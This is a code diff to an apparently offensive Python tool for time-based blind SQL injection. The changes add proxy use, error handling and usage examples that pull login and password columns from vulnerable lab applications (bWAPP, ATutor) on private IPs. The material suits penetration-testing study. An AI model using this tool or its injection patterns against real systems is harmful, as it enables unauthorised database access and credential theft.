@@ -37,7 +37,7 @@ from random_useragent.random_useragent import Randomize     # Randomize useragen
 
 # Optionally, use a proxy
 # proxy = "http://<user>:<pass>@<proxy>:<port>"
-proxy = ""
+proxy = "http://localhost:8080"
 os.environ['http_proxy'] = proxy
 os.environ['HTTP_PROXY'] = proxy
 os.environ['https_proxy'] = proxy
@@ -130,8 +130,12 @@ def get_rows(url,headers,get_post,prefix,suffix,inj_param,params,table,sleep):
                 rows += row_char
                 print(row_char,end='',flush=True)
                 break
-    print("\n[*] Found " + rows + " rows of data in table '" + table + "'\n")
-    return int(rows)
+    
+    if rows != "":
+        print("\n[*] Found " + rows + " rows of data in table '" + table + "'\n")
+        return int(rows)
+    else:
+        return False
 
 # Loop through positions and characters
 def get_data(url,headers,get_post,prefix,suffix,inj_param,params,row,column,table,sleep):
@@ -169,7 +173,9 @@ def main(argv):
         url = sys.argv[7]
         sleep = int(sys.argv[8])
     else:
-        print("[*] Usage: " + sys.argv[0] + " <param1,param2,..> <get_or_post> <prefix> <suffix> <column1,column2,..> <table> <url> <sleep_in_seconds>")
+        print("[*] Usage: " + sys.argv[0] + " <param1,param2,..> <get_or_post> <prefix> <suffix> <column1,column2,..> <table> <url> <sleep_in_seconds>\n")
+        print("[*] Example: " + sys.argv[0] + " id get \"1 \" \"'#\" login,password users http://192.168.252.6/cat.php 1")
+        print("[*] Example: " + sys.argv[0] + " q get \"1') \" \"'%23\" login,password AT_members http://192.168.252.12/ATutor/mods/_standard/social/index_public.php 2")
         print("[*] Example: " + sys.argv[0] + " title,action get \"1'\" \"\" login,password users http://192.168.252.5/bWAPP/sqli_15.php 2\n")
         exit(0)
 
@@ -188,6 +194,9 @@ def main(argv):
         # Getting rows
         print("[*] Printing number of rows in table...")
         rows = get_rows(url,headers,get_post,prefix,suffix,inj_param,params,table,sleep)
+        if not rows:
+            print("[!] Unable to retrieve rows, checks requests.\n")
+            exit(-1)
 
         # Getting values for found rows in specified columns
         for column in columns:
